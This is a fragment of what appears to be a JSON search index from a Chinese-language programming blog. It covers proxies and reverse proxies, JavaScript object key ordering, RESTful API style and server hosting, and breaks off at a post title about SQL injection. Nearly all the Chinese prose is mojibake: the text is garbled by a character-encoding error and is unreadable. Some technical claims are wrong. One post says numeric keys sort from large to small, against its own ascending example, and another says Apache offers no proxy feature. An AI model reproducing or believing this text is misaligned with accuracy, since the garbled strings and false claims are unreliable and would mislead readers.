IPã€ï¼Œä¾‹å¦‚ä¸€äº›ä¸­åœ‹çš„ç¶²ç«™ï¼Œåªè¦ä½ ä¸æ˜¯ç”¨ä¸­åœ‹ IP é€£çš„è©±éƒ½æœƒè¢«æ“‹ï¼Œæ²’è¾¦æ³•é€£ä¸Šå»ã€‚ é€™å€‹æ™‚å€™å°±å¯ä»¥é€éã€ŒProxyã€ä¾†å¹«ä½ è™•ç†é€™å€‹å•é¡Œï¼Œä»–çš„æµç¨‹å°±è·Ÿä¸Šé¢çš„åœ–ä¸€æ¨£ï¼š å¾ client ç™¼ä¸€å€‹ request åˆ° proxy proxy å†æ ¹æ“šå…§å®¹å° server ç™¼å‡º request server çœ‹åˆ° proxy ä»¥ç‚ºæ˜¯ä¸­åœ‹çš„ IPï¼Œå°±æŠŠ response å›å‚³çµ¦ proxy proxy å†æŠŠæ‹¿åˆ°çš„æ±è¥¿å‚³å›çµ¦ client ä½ å¯èƒ½æœƒæƒ³èªªã€Œé‚£ server ä¸æœƒçŸ¥é“æ˜¯ proxy ç™¼éä¾†çš„å—ï¼Ÿã€ï¼Œé€™æ™‚å€™æ›ä½æ€è€ƒçš„é‡è¦æ€§å°±ä¾†äº†ï¼š å‰›å‰›ç¬¬ä¸€å¼µåœ–æ˜¯å¾ client çš„è§’åº¦ä¾†çœ‹ï¼Œæ‰€ä»¥ä½ ç•¶ç„¶æœƒçŸ¥é“ã€Œæˆ‘æ˜¯é€é proxy ä¾†ç™¼ requestã€çš„é€™ä»¶äº‹ã€‚å¯æ˜¯å° server ä¾†èªªä¸æ˜¯é€™æ¨£ï¼Œå®ƒåªæœƒçŸ¥é“æœ‰äººç™¼äº†ä¸€å€‹ request éä¾†ï¼Œä½†æ˜¯ä¸æ˜¯é€é proxyï¼Ÿå®ƒåŸºæœ¬ä¸Šä¸æœƒçŸ¥é“ï¼ˆé‚„æ˜¯æœ‰ä¸€äº›ç‰¹ä¾‹å•¦ï¼‰ï¼Œè€Œä¸”ä¹Ÿä¸æœƒçŸ¥é“æ˜¯å“ªå€‹ client ç™¼éä¾†çš„ï¼ˆé€™å€‹å¾ˆé‡è¦å¾ˆé‡è¦ï¼‰ã€‚ æ‰€ä»¥å‘¢ï¼Œé€™å°±æ˜¯ç‚ºä»€éº¼ proxy å¯ä»¥é‹ä½œçš„åŸç†ã€‚ ç”¨ proxy çš„å¥½è™•å¾ä¸Šé¢ä¾‹å­ä¾†çœ‹æœƒç™¼ç¾å…©å€‹å¥½è™•ï¼š åŠ å¼·éš±ç§ï¼šclient å¯ä»¥æŠŠè‡ªå·±çš„è³‡è¨Šéš±è—ä¸è®“ server çŸ¥é“ è§£é™¤é™åˆ¶ï¼šå°±ç®—æœƒæ“‹ IP çš„ç¶²ç«™æˆ‘é‚„æ˜¯å¯ä»¥é€£ä¸Šå» é™¤äº†é€™å…©å€‹ä»¥å¤–ï¼Œproxy é‚„æœ‰å¦å¤–ä¸€å€‹å¥½è™•æ˜¯ã€ŒCache æ©Ÿåˆ¶ã€ã€‚ åœ¨æœ‰äº›æƒ…æ³ä¸‹ï¼Œproxy å¯ä»¥æŠŠå¾ˆå¸¸å‡ºç¾çš„ request çµ¦ cache èµ·ä¾†ï¼Œç•¶ä¸‹æ¬¡æœ‰äººå†ç™¼åŒæ¨£çš„ request æ™‚ï¼Œç›´æ¥æŠŠ cache çš„æ±è¥¿å›å‚³å°±å¥½ï¼Œä¸ç”¨å†ç‰¹åœ°å° server ç™¼ä¸€æ¬¡ requestã€‚ åå‘ä»£ç†ä¸Šé¢æœ‰è½æ‡‚çš„è©±é€™å€‹å°±å¥½è¬›äº†ï¼Œè·Ÿå‰›å‰›å¹¾ä¹ä¸€æ¨£ï¼Œåªæ˜¯èº«åˆ†å°èª¿éä¾†è€Œå·²ï¼š æ—¢ç„¶ client å¯ä»¥é€é proxy ä¾†ç™¼ requestï¼Œé‚£ server ä¹ŸåŒç†ï¼Œå¯ä»¥é€é proxy ä¾†è™•ç† requestã€‚ ä½ å¯èƒ½æœƒæƒ³èªªã€Œç¢ºå¯¦å¦‚æ­¤ï¼Œä¸éé€™è¦å¹¹å˜›é˜¿ï¼Ÿã€ è¦çŸ¥é“åŸå› å°±å¾—å…ˆäº†è§£ä¸€äº›ç¶²è·¯åŸºç¤æ¦‚å¿µã€‚ é¦–å…ˆç•¶æˆ‘å€‘æ¶äº†ä¸€å° server è·‘ HTTP æœå‹™æ™‚ï¼Œé€šå¸¸æœƒè®“å®ƒè·‘åœ¨ 80 portï¼ˆç«¯å£ï¼‰ï¼Œè½èµ·ä¾†è »åˆç†çš„ã€‚å¯æ˜¯å…¶å¯¦æœ‰å€‹å•é¡Œï¼Œå‡è¨­ server ä¹Ÿæœ‰å…¶ä»–æœå‹™è¦è·‘çš„è©±ï¼Œå°±å¾—å†åŠ é–‹å…¶ä»–çš„ port ä¾†è·‘ï¼Œç•¢ç«Ÿä½ ä¸å¯èƒ½ç‚ºäº†åŠ é–‹ä¸€é …æœå‹™å†å»è²·ä¸€å°ä¸»æ©Ÿå§ï¼ˆéŒ¢å¤ªå¤šå¯ä»¥åˆ†æˆ‘ QQï¼‰ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œé€™æ¨£åšçš„å•é¡Œæ˜¯ã€Œç¶²å€æœƒè®Šå¾—å¾ˆé›£çœ‹ã€ï¼š é™„è¨»ï¼šé è¨­æ˜¯è·‘ 80 portï¼Œæ‰€ä»¥ç¬¬ä¸€å€‹æ‰ä¸ç”¨åŠ ä¸Š :80 ç°¡å–®ä¾†èªªï¼Œä½ æ‡‰è©²å¾ä¾†ä¸æœƒç”¨ä»€éº¼ https:facebook.com:3001 æˆ– https://google.com:8001 ä¾†é€£åˆ° FB æˆ– Google å§ï¼Ÿæˆ‘èªªçš„å¾ˆé†œå°±æ˜¯é€™å€‹æ„æ€ï¼Œæä¸å¥½ä½ é€£ port æ˜¯ä»€éº¼æ±è¥¿éƒ½ä¸çŸ¥é“ï¼Œæ€éº¼å¯èƒ½é‚„æŒ‡æœ›ä½ ä¾†æˆ‘çš„ç¶²ç«™æ™‚é‚„è¦åŠ ä¸Šç«¯å£è™Ÿï¼Ÿ ä½†é€™æ™‚å€™æœ‰ proxy å°±ä¸ä¸€æ¨£äº†ï¼Œé€™å€‹æŠ€å·§æ˜¯ã€Œ80 port æ‹¿ä¾†è·‘ proxyï¼Œproxy åœ¨é€éå­ç¶²åŸŸä¾†åˆ¤æ–·è¦æŠŠ request äº¤çµ¦å“ªå€‹ serverã€ é€™æ¨£å­åšä»¥å¾Œï¼Œå°±ä¸ç”¨åœ¨è¼¸å…¥ç«¯å£è™Ÿé€™éº¼éº»ç…©äº†ï¼Œå› ç‚º proxy éƒ½å¹«ä½ è¨­å®šå¥½äº†ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æœ‰äº›äººæœƒæ¨è–¦ç”¨ Nginx ä¾†æ¶ä¼ºæœå™¨çš„åŸå› ï¼Œå› ç‚º Nginx æœ‰æä¾› prxoy çš„åŠŸèƒ½ï¼Œè€Œ Apache æ²’æœ‰ã€‚ ä¸éé‚„æ˜¯è¦æ³¨æ„å‰›å‰›æåˆ°çš„æ›ä½æ€è€ƒï¼š å° client è€Œè¨€ä¹Ÿä¸€æ¨£ï¼Œå®ƒä¸æœƒçŸ¥é“ç™¼å‡ºå»çš„ request æ˜¯çœŸçš„ server é‚„æ˜¯ proxyï¼Œé€™é»å¾ˆé‡è¦ã€‚","link":"/2022/03/28/what-is-proxy-and-revers-proxy/"},{"title":"é€™å€‹è¿´åœˆå¯èƒ½è·Ÿä½ æƒ³çš„ä¸ä¸€æ¨£","text":"é€™ç¯‡çš„æ¨™é¡Œå¯¦åœ¨å‘½åéšœç¤™ã€‚ ç°¡è¿°ç›´æ¥ä¾†çœ‹æ®µä¾‹å­ï¼š 1234567const obj = {}const array = [5, 4, 3, 2 ,1];for (const item of array) { obj[item] = `this is ${item}`;}console.log(obj); ä½ è¦ºå¾—ç­”æ¡ˆæœƒæ˜¯å“ªå€‹ï¼Ÿ 12345678910111213141516// ç¬¬ä¸€ç¨®{ '1': 'this is 1', '2': 'this is 2', '3': 'this is 3', '4': 'this is 4', '5': 'this is 5'}// ç¬¬äºŒç¨®{ '5': 'this is 5' '4': 'this is 4', '3': 'this is 3', '2': 'this is 2', '1': 'this is 1',} æˆ‘çŸ¥é“ï¼è¿´åœˆæ˜¯æŒ‰ç…§ 5 4 3 2 1 ä¾†è·‘çš„ï¼Œæ‰€ä»¥æ˜¯ã€Œç¬¬äºŒç¨®ã€ï¼ é€™ä¹Ÿæ˜¯æˆ‘åŸæœ¬çš„æƒ³æ³•ï¼Œä¸éæ­£ç¢ºç­”æ¡ˆæ˜¯ã€Œç¬¬ä¸€ç¨®ã€ã€‚ ä½ å¯èƒ½æœƒæƒ³èªªã€Œé‚£æ‡‰è©²æ˜¯å› ç‚º array å­˜çš„æ˜¯æ•¸å­—çš„é—œä¿‚å§ï¼Ÿã€ å¥½ï¼Œé‚£æˆ‘å€‘ä¾†è©¦è©¦çœ‹å­˜æˆå­—ä¸²æ˜¯ä¸æ˜¯å°±å’Œæˆ‘å€‘æƒ³çš„ä¸€æ¨£äº†ï¼Ÿ 1234567const obj = {}const array = ['5', '4', '3', '2' ,'1'];for (const item of array) { obj[item] = `this is ${item}`;}console.log(obj); ç›´æ¥æ‹¿åˆ° console è·‘ï¼Œä½ æœƒç™¼ç¾çµæœä¸€æ¨£ï¼Œè€Œä¸”é‚„è¢«è½‰æˆæ•¸å­—äº†ï¼š å¥½ï¼Œèªªåˆ°é€™è£¡å…¶å¯¦åªæ˜¯æƒ³è¬›æ¸…æ¥šå…©ä»¶äº‹ï¼š Object çš„ key å¦‚æœæ˜¯æ•¸å­—ï¼Œé‚£æœƒã€Œç”±å¤§åˆ°å°ã€ä¾†æ’ï¼Œè€Œä¸æ˜¯ä½ ã€Œæ”¾é€²å»çš„é †åºã€ å¦‚æœä½ å­˜çš„ã€Œå­—ä¸²ã€é•·çš„å¤ªåƒæ•¸å­—ï¼ˆä¸Šé¢çš„ä¾‹å­ï¼‰ï¼Œå°±æœƒè¢«è½‰æˆã€Œæ•¸å­—ã€ é‚„æ˜¯ä¸æ‡‚çš„è©±é€™å†èˆ‰æœ€å¾Œä¸€å€‹ä¾‹å­çµ¦ä½ åƒè€ƒï¼š 123456const obj2 = { '100': 'yo', '50': 'yo', '10': 'yo'}console.log(obj2); // {10: 'yo', 50: 'yo', 100: 'yo'} å¯æ˜¯æˆ‘å¦‚æœå°±æ˜¯æƒ³ç”¨æ•¸å­—çš„å½¢å¼ä¾†å„²å­˜ key çš„è©±æ€éº¼è¾¦ï¼Ÿè¨˜å¾—å‰›å‰›èªªçš„å—ï¼Œæˆ‘èªªå¦‚æœä½ å­˜çš„å­—ä¸²å¤ªåƒæ•¸å­—çš„è©±æ‰æœƒè¢«è½‰æˆæ•¸å­—ã€‚ æ‰€ä»¥åå…¶é“è€Œè¡Œï¼Œä¸è¦è®“å®ƒçœ‹èµ·ä¾†é‚£éº¼åƒæ•¸å­—å°±å¥½äº†ï¼š é™„è¨»ï¼šå¯¦éš›æ¡ˆä¾‹å¯ä»¥åƒè€ƒ JavaScript æ•´ç†è³‡æ–™çš„ç¯„ä¾‹ 123456const obj2 = { ' 100': 'yo', ' 50': 'yo', ' 10': 'yo'}console.log(obj2); æ²’éŒ¯ï¼Œå°±æ˜¯åŠ ä¸Šä¸€å€‹ã€Œç©ºæ ¼ã€ã€‚é€™æ¨£å°±ä¸æœƒè¢«ç•¶æˆæ•¸å­—äº†ï¼Œé †åºä¹Ÿæœƒä¾ç…§ä½ æ‰€æƒ³çš„ä¾†æ’ã€‚","link":"/2022/03/17/what-is-real-order/"},{"title":"åˆ°åº•ä»€éº¼æ˜¯ RESTfulï¼Ÿ","text":"çµ‚æ–¼ç­è§£å®ƒäº†ã€‚ ç°¡è¿°RESTfulï¼ˆRepresentational State Transferï¼‰è¡¨ç¾å±¤ç‹€æ…‹è½‰æ›ï¼›å®ƒçš„åå­—æ²’æœ‰å¾ˆé‡è¦ï¼Œåªæ˜¯è®“ä½ å€‘çŸ¥é“ä¸€ä¸‹è€Œå·²ã€‚ ä½†é‡è¦çš„äº‹æƒ…æ˜¯ï¼š å®ƒæ˜¯ä¸€ç¨®ã€Œé¢¨æ ¼ã€ï¼Œä¸æ˜¯ã€Œè¦ç¯„ã€ å®ƒæ˜¯ä¸€ç¨®ã€Œé¢¨æ ¼ã€ï¼Œä¸æ˜¯ã€Œè¦ç¯„ã€ å®ƒæ˜¯ä¸€ç¨®ã€Œé¢¨æ ¼ã€ï¼Œä¸æ˜¯ã€Œè¦ç¯„ã€ å°±å¥½åƒæ¯å€‹äººéƒ½æœ‰è‡ªå·±çš„ coding styleï¼Œä½†ç¸½æœƒæœ‰å¹¾å€‹æ¯”è¼ƒä¸»æµçš„é¢¨æ ¼ï¼Œåƒæ˜¯ camelCaseï¼ŒisBoolean ç­‰ç­‰é€™ç¨®å¤§å®¶éƒ½èªåŒçš„ç´„å®šä¿—æˆã€‚RESTful ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œåªæ˜¯ä»–æ˜¯æ‡‰ç”¨åœ¨ API ä¸Šé¢çš„ä¸€ç¨®é¢¨æ ¼ã€‚ ä½ å¯ä»¥ä¸ç…§è‘—å¤§å®¶çš„é¢¨æ ¼èµ°ï¼Œä½†åˆ¥äººå°±å¾—å¤šèŠ±å¿ƒæ€çœ‹ä½ å¯«çš„æ±è¥¿å°±æ˜¯äº†ã€‚ RESTful ä¹Ÿå°±æ˜¯é€™æ¨£çš„æ¦‚å¿µè€Œå·²ï¼Œç…§è‘—é€™å€‹é¢¨æ ¼å»è¨­è¨ˆ APIï¼Œæœƒè®“å¤§å®¶ç”¨ API çš„æ™‚å€™æ¯”è¼ƒé †ã€‚èªªç©¿äº†å®ƒçš„æœ¬æ„åªæ˜¯ã€Œå¸Œæœ›ä½ å¥½å¥½çš„å–„ç”¨ HTTP æä¾›çš„å‹•è©ä¾†è¨­è¨ˆ APIã€ï¼Œåƒ…æ­¤è€Œå·²ã€‚ å¦‚æœæ²’æœ‰ RESTful çš„è©±ï¼Ÿæ²’æœ‰ RESTful çš„è©±ï¼Œä¸€å€‹ API å¯èƒ½æœƒè¢«è¨­è¨ˆæˆé€™æ¨£å­ï¼š å¾é€™å¼µåœ–å¯ä»¥å…ˆçœ‹åˆ°ä¸€äº›å•é¡Œï¼Œåƒæ˜¯ã€Œåˆªé™¤ä½¿ç”¨è€…ã€è·Ÿã€Œæ›´æ”¹ä½¿ç”¨è€…ã€æ€éº¼æœƒéƒ½æ˜¯ POSTï¼Ÿä¸æ˜¯æ‡‰è©²è¦ç”¨ DELETE è·Ÿ PATCH å—ï¼Ÿå†ä¾†ï¼Œæ¯å€‹åŠŸèƒ½éƒ½å¾—ç‰¹åœ°å»ºç«‹ä¸€å€‹æ–°çš„ç¶²å€è·¯å¾‘ï¼Œæ˜¯ä¸æ˜¯æœ‰é»éº»ç…©ï¼Ÿ ä½ å¯èƒ½æœƒæƒ³èªªç‚ºä»€éº¼å¯ä»¥é€™æ¨£å­å¯«ï¼Ÿä½†å¦‚æœä½ å¯«éä¸€é»é»çš„å¾Œç«¯çš„è©±ï¼ˆä¸æ‡‚å¯ä»¥åƒè€ƒ é€™è£¡ï¼‰ï¼Œå°±æœƒçŸ¥é“ä¸ç®¡æ˜¯ç”¨å“ªå€‹ HTTP æ–¹æ³•éƒ½ä¸æœƒå½±éŸ¿ä½ æ¥ä¸‹ä¾†è¦åšçš„äº‹æƒ…ã€‚ åŸå› æ˜¯é€™æ¨£å­ï¼Œæ¯å€‹åŠŸèƒ½éƒ½å°æ‡‰åˆ°ä¸åŒçš„ç¶²å€ï¼Œæ‰€ä»¥åªè¦æœ‰äººç™¼é€ request åˆ°é€™éš» APIï¼Œç®¡ä»–è¦ç”¨ POST é‚„æ˜¯ GETï¼Œå¾Œç«¯éƒ½å¯ä»¥åšç›¸å°æ‡‰çš„è™•ç†ã€‚ ä¹Ÿè¨±é€™æ¨£å­é‚„æ˜¯å¯ä»¥å¯¦ç¾è©²æœ‰çš„åŠŸèƒ½ï¼Œä½†çµ‚ç©¶é‚„æ˜¯æœƒç¢°åˆ°ä¸€äº›å°éº»ç…©ï¼š 1. æ¯å€‹äººçš„å‘½åé¢¨æ ¼ä¸åŒ ä»¥ä¸Šé¢çš„ã€Œæ–°å¢ä½¿ç”¨è€…ã€ä¾†èªªï¼ŒA å¯èƒ½æƒ³å– new_userï¼ŒB å¯èƒ½æƒ³å– creat_userï¼ŒC å¯èƒ½æƒ³å«creat_new_userï¼Œé‚£æœ€å¾Œåˆ°åº•è©²å«ä»€éº¼æ‰å¥½ï¼Ÿå¦‚æœæ²’æœ‰ä¸€å€‹çµ±ä¸€çš„é¢¨æ ¼å°±æœƒè®Šå¾—å¾ˆéº»ç…©ã€‚ 2. æ¯å€‹äººçš„å‹•ä½œä¸ä¸€è‡´ A å¯èƒ½è¦ºå¾—è¦å­˜å–ä½¿ç”¨è€…è³‡æ–™å°±è©²ç”¨ GETï¼ŒB è¦ºå¾—ç„¡æ‰€è¬‚ï¼›æˆ–æ˜¯ A æ±ºè¦ºå¾—åˆªé™¤ä½¿ç”¨è€…è³‡æ–™è©²ç”¨ DELETEï¼ŒB è¦ºå¾— POST ä¹Ÿæ²’å·®é˜¿ï¼Œåæ­£åªè¦ç™¼åˆ°æ­£ç¢ºçš„ç¶²å€æˆ‘éƒ½é‚„æ˜¯å¯ä»¥è™•ç†é˜¿ã€‚ ç‚ºä»€éº¼æœƒæœ‰é€™ç¨®å•é¡Œï¼Ÿå› ç‚º HTTP è¦å®šçš„åªæ˜¯ä½ åœ¨ã€Œæºé€šã€çš„æ™‚å€™è¦éµå¾ª GET POST DELETE é€™äº›æ ¼å¼ï¼Œä½†ä¸¦å®ƒæ²’æœ‰è¦ç¯„ä½ åœ¨æ”¶åˆ°è¨Šæ¯å¾Œçš„ã€Œå¯¦éš›è¡Œç‚ºã€ã€‚ ä»¥è¨‚ä¾¿ç•¶çš„ä¾‹å­ä¾†èªªï¼Œå¦‚æœæœ‰å€‹æ–°ä¾†çš„åŒå­¸ä¸çŸ¥é“ã€Œè¨‚ä¾¿ç•¶ã€è¦ç”¨ POST ä»£è™Ÿï¼Œæ‰€ä»¥ä»–å¯«æˆGETï¼š 1234GETé€é”æ™‚é–“ï¼šç¬¬å››å ‚é›è…¿é£¯ 5é›æ’é£¯ 2 æœ€å¾Œæ”¶åˆ°é€™å¼µç´™æ¢çš„äººé›–ç„¶çœ‹åˆ°ä¸Šé¢å¯«çš„æ˜¯ GETï¼Œä½†é‚„æ˜¯èƒ½å¾å…§å®¹åˆ¤æ–·å‡ºé€™å€‹è«‹æ±‚æ˜¯è¦ã€Œè¨‚ä¾¿ç•¶ã€ï¼Œä¹Ÿå°±æ˜¯ POSTï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥å¹«ä»–å®Œæˆè¨‚ä¾¿ç•¶çš„å‹•ä½œã€‚ æ›æˆ HTTP ä¹Ÿæ˜¯åŒæ¨£çš„æ¦‚å¿µï¼Œä½ åœ¨å‰ç«¯è¦ç™¼ request ä¸€å®šè¦éµå¾ª HTTP çš„æ–¹å¼ä¾†æºé€šï¼Œä½†å¾Œç«¯æ¥åˆ° request å¾Œä»–ã€Œå¯¦éš›è¦åšä»€éº¼ã€ï¼Œéƒ½ä¸åœ¨ HTTP è¦ç¯„çš„ç¯„åœè£¡ã€‚ å¦‚æœæœ‰äº† RESTfulï¼Ÿ ç‚ºäº†è§£æ±ºä¸Šé¢çš„å•é¡Œï¼ŒRESTful æå‡ºä¸€å€‹å¾ˆç°¡å–®çš„æ¦‚å¿µï¼šæŠŠè³‡æºçµ¦çµ±ä¸€åŒ– ä»”ç´°æƒ³ä¸€ä¸‹ï¼Œå…¶å¯¦ä¸ç®¡æ˜¯æ–°å¢ã€åˆªé™¤ã€æŸ¥è©¢ç­‰ç­‰çš„å‹•ä½œï¼Œæˆ‘å€‘éƒ½æ˜¯åœ¨å° users é€™å€‹è³‡æºåšäº‹æƒ…ï¼Œé‚£ç‚ºä»€éº¼ä¸ä¹¾è„†å°±çµ±æ•´æˆ usersï¼Œå†æ­é… HTTP æä¾›çš„é‚£äº›å‹•ä½œä¾†åšå€åˆ†å°±å¥½ï¼Ÿ ä»¥ä¸Šé¢ä¾‹å­ä¾†èªªï¼Œè¦è®“ /users é€™å€‹ç¶²å€åŒæ™‚è™•ç†ã€Œæ–°å¢ã€è·Ÿã€Œåˆªé™¤ã€é€™å…©å€‹å‹•ä½œï¼Œä½ åªè¦ç™¼é€ä¸€å€‹ POST æˆ– GET çš„è«‹æ±‚æˆ‘å°±èƒ½çœ‹å‡ºä¾†ä½ æƒ³åšçš„æ˜¯ä»€éº¼ï¼Œæ‰€ä»¥å°±ä¸å¿…åœ¨åˆ†æˆ /new_user æˆ– /creat_user äº†ã€‚ ç¸½è€Œè¨€ä¹‹ï¼ŒRESTful åªæ˜¯ä¸€å€‹ã€Œé¢¨æ ¼ã€ï¼Œä¸æ˜¯ã€Œè¦ç¯„ã€ï¼Œä½ ä¸æƒ³ä½¿ç”¨ä¹Ÿæ²’é—œä¿‚ã€‚é€™å°±è·Ÿåœ¨å¯« HTML çš„æ™‚å€™å¾ˆåƒï¼ŒHTML æ²’æœ‰è¦å®šä½ ä¸€å®šè¦ç”¨ &lt;article&gt;ã€&lt;section&gt; é‚£äº›èªæ„æ¨™ç±¤ã€‚ä½ å¯ä»¥éƒ½ä¸è¦ç”¨é‚£äº›æ¨™ç±¤ï¼Œä¸€è·¯ &lt;div&gt;ã€&lt;span&gt; åˆ°åº•ã€‚ é€™æœƒæ€éº¼æ¨£å—ï¼Ÿä¸æœƒï¼Œåªæ˜¯æ²’æœ‰é€™éº¼ä¸€ç›®äº†ç„¶è€Œå·²ã€‚","link":"/2022/01/05/what-is-restful/"},{"title":"ä»€éº¼æ˜¯ä¼ºæœå™¨ï¼Ÿ","text":"è§£é™¤å¤šå¹´ç–‘æƒ‘ã€‚ ç°¡è¿°ä¼ºæœå™¨å…¶å¯¦åªæ˜¯ä¸€å°è£äº†ã€Œä¼ºæœå™¨ç¨‹å¼ã€çš„é›»è…¦ï¼Œä¾‹å¦‚ï¼šApache å°±æ˜¯ä¸€ç¨®ä¼ºæœå™¨ç¨‹å¼ã€‚ æ‰€ä»¥å‘¢ï¼Œåªè¦ä½ åœ¨è‡ªå·±çš„é›»è…¦ä¸Šè£ä¼ºæœå™¨ç¨‹å¼ï¼Œå°±å¯ä»¥èªªå®ƒæ˜¯ä¸€å°ã€Œä¼ºæœå™¨ã€ã€‚ è«‡è«‡é—œæ–¼ä¼ºæœå™¨ä¸»æ©Ÿé›–ç„¶èªªåªè¦å®‰è£ä¼ºæœå™¨ç¨‹å¼å°±å¯ä»¥ç•¶æˆæ˜¯ä¸€å€‹ä¼ºæœå™¨ï¼Œä¸éæœ‰å¹¾å€‹å•é¡Œï¼š æ­£å¸¸äººä¸æœƒæƒ³è®“é›»è…¦ 24 å°æ™‚å…¨å¹´ç„¡ä¼‘çš„é–‹è‘—å§ï¼Ÿ å®¶è£¡é›»è…¦çš„ç¶²è·¯æœ‰å¯èƒ½æ˜¯æµ®å‹• IPï¼Œä¸€ç›´è®Šä¾†è®Šå»çš„è©±åˆ¥äººæ˜¯è¦æ€éº¼é€£ï¼Ÿ æ‰€ä»¥æ¥ä¸‹ä¾†æœƒä¾†ä»‹ç´¹å¹¾ç¨®å»ºç«‹ä¼ºæœå™¨çš„æ–¹å¼ï¼š å¯¦é«”ä¸»æ©Ÿ è™›æ“¬ç©ºé–“ è™›æ“¬ä¸»æ©Ÿ å¯¦é«”ä¸»æ©Ÿé€™å€‹å°±æ˜¯å‰é¢è¬›çš„ï¼Œåœ¨ã€Œå¯¦é«”é›»è…¦ã€ä¸Šå®‰è£ä¼ºæœå™¨ç¨‹å¼ä¾†ç”¨ï¼Œä¾‹å¦‚æˆ‘ç¾åœ¨ç”¨çš„é›»è…¦å°±æ˜¯ä¸€å°å¯¦é«”ä¸»æ©Ÿã€‚ä¸éå¸¸è¦‹çš„åšæ³•æ˜¯å»å¤–é¢è·Ÿäººå®¶ã€Œç§Ÿä¸€å°ã€å¯¦é«”ä¸»æ©Ÿä¾†ç”¨ï¼Œç‚ºäº†é¿å…å‰é¢æçš„é‚£äº›å•é¡Œã€‚ å¯¦é«”ä¸»æ©Ÿçš„ç‰¹æ€§æ˜¯ä½¿ç”¨è€…æ“æœ‰ã€Œä¸»æ©Ÿçš„æ§åˆ¶æ¬Šå’Œè³‡æºã€ï¼Œæ‰€ä»¥æƒ³æ€éº¼æéƒ½å¯ä»¥ã€‚ ä¸éæœ‰ä¸€å€‹å¾ˆå¤§çš„ç¼ºé»ï¼šç•¶å¯¦é«”ä¸»æ©Ÿå£äº†ï¼Œæ±è¥¿å°±å£æ‰äº†ã€‚ è™›æ“¬ç©ºé–“ä¸€å°é›»è…¦çš„æŸå€‹ç©ºé–“ï¼ˆåƒæ˜¯è³‡æ–™å¤¾ï¼‰ï¼Œä½ æ²’æœ‰é€™å°é›»è…¦çš„æ‰€æœ‰æ§åˆ¶æ¬Šï¼Œåªä¾·é™åœ¨æˆ‘çµ¦ä½ çš„é€™å€‹ç©ºé–“ï¼ˆè³‡æ–™å¤¾ï¼‰è£¡é¢ï¼Œä½ å¯ä»¥æ”¾æª”æ¡ˆåœ¨é€™è£¡ï¼Œä½†ä¸å¯ä»¥è£æ–°çš„ä¼ºæœå™¨ç¨‹å¼ä¹Ÿä¸èƒ½ç©éŠæˆ²ã€‚ å¯¦éš›ä¾‹å­ï¼šåªèƒ½ç”¨ FTP ä¾†å‚³æª”æ¡ˆï¼Œå› ç‚ºæ²’æœ‰æ§åˆ¶æ¬Šã€‚ è™›æ“¬ä¸»æ©Ÿï¼ˆç›®å‰çš„ä¸»æµï¼‰æœ¬è³ªä¹Ÿæ˜¯ä¸€å°ã€Œå¯¦é«”ä¸»æ©Ÿã€ï¼Œä½†è£¡é¢å¯ä»¥æœ‰å¾ˆå¤šå€‹è™›æ“¬ä¸»æ©Ÿï¼Œå°±åƒæˆ‘å¯ä»¥åœ¨é›»è…¦ä¸ŠåŒæ™‚è£ Macã€Linux ç³»çµ±çš„é“ç†å·®ä¸å¤šã€‚ ç°¡å–®ä¾†èªªå¯ä»¥æƒ³æˆæ˜¯è·Ÿåˆ¥äººå…±ç”¨ä¸€å°é›»è…¦çš„æ¦‚å¿µï¼Œä½†è·Ÿè™›æ“¬ç©ºé–“ä¸åŒçš„æ˜¯æ‰€æœ‰äººéƒ½æœ‰é€™å°ä¸»æ©Ÿçš„æ§åˆ¶æ¬Šï¼Œå¯ä»¥å®‰è£ä¼ºæœå™¨ç¨‹å¼ã€ä¹Ÿå¯ä»¥æ”¾è‡ªå·±çš„ç¶²ç«™ä¹‹é¡çš„ã€‚ å¦å¤–æ˜¯è³‡æºè¦è·Ÿå¤§å®¶å…±äº«ï¼Œä¾‹å¦‚èªªå¯¦é«”ä¸»æ©Ÿåªæœ‰ 4GB çš„ RAMï¼Œç¾åœ¨æœ‰å››å€‹è™›æ“¬ä¸»æ©Ÿï¼Œä»£è¡¨æ¯å€‹è™›æ“¬ä¸»æ©Ÿåªèƒ½åˆ†é…åˆ° 1GB çš„ RAMã€‚ å¥½è™•æ˜¯ä¸ç”¨æ“”å¿ƒã€Œå¯¦é«”ä¸»æ©Ÿå£æ‰ã€çš„å•é¡Œï¼Œå› ç‚ºè™›æ“¬ä¸»æ©Ÿå¯ä»¥å†é·ç§»åˆ°åˆ¥çš„å¯¦é«”ä¸»æ©Ÿä¸Šã€‚åŸç†å¯ä»¥æƒ³æˆæ˜¯è™›æ“¬ä¸»æ©Ÿä¹Ÿæ˜¯æŸç¨®ã€Œç¨‹å¼ã€ï¼Œåªè¦æŠŠç¨‹å¼æ”¾åˆ°åˆ¥çš„ä¸»æ©Ÿä¸Šä¾†è·‘ä¸€æ¨£èƒ½é‹ä½œã€‚ ç®¡ç†ä¸»æ©Ÿçš„æ–¹æ³•é—œæ–¼è™›æ“¬ä¸»æ©Ÿï¼Œä½ å¯èƒ½æœƒå¥½å¥‡ã€Œé›»è…¦ä¸åœ¨æˆ‘é€™è£¡çš„è©±ï¼Œè¦æ€éº¼æ“æ§å®ƒï¼Ÿã€ï¼Œæ‰€ä»¥é€™é‚Šæœƒåšå€‹è§£é‡‹ã€‚ æ¯”è¼ƒå¸¸è¦‹çš„ä½œæ³•æœ‰å…©ç¨®ï¼š é ç«¯æ¡Œé¢ é€éæŸç¨®æ–¹å¼é€£åˆ°é ç«¯é›»è…¦ï¼ŒæŠŠç•«é¢é¡¯ç¤ºåˆ°è‡ªå·±çš„é›»è…¦ä¸Šï¼ˆWindow æ¯”è¼ƒå¸¸è¦‹ï¼‰ã€‚ SSHï¼ˆSecure shellï¼‰ é€é CLI ä¾†é€£åˆ°é ç«¯çš„ä¸»æ©Ÿï¼Œæ¥è‘—å°±èƒ½ã€Œä¸‹æŒ‡ä»¤ã€ä¾†æ“æ§ã€‚ é€£åˆ°è™›æ“¬ä¸»æ©Ÿçš„ç•«é¢å¤§æ¦‚å°±é•·é€™æ¨£ï¼š è·Ÿä¸€èˆ¬çš„ GUI ä¸åŒï¼Œä½ åªèƒ½é€é CLI ä¾†è·Ÿå®ƒæºé€šï¼Œé€™æ™‚å€™å°±è€ƒé©—ä½ å° CLI çš„ç†Ÿæ‚‰åº¦äº†ã€‚","link":"/2022/03/09/what-is-server/"},{"title":"ç”¨ SQL Injection 